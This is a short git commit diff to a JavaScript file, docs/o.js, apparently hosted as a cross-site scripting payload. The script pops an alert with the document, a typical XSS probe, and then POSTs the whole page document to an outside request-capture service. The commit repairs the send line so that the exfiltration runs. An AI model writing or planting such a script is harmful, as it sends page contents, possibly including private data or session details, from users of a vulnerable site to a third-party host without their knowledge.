ebf7499d54e45069fd81606b661d07c789c36c0e
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 17:36:56 +0100

    Update and rename q.js to o.js

--- docs/o.js
+++ docs/o.js
@@ -3,4 +3,4 @@ alert(document);
 var xhr = new XMLHttpRequest();
 xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
 xhr.setRequestHeader('Content-Type', 'application/json');
-xhr.send(document));
+xhr.send(document);
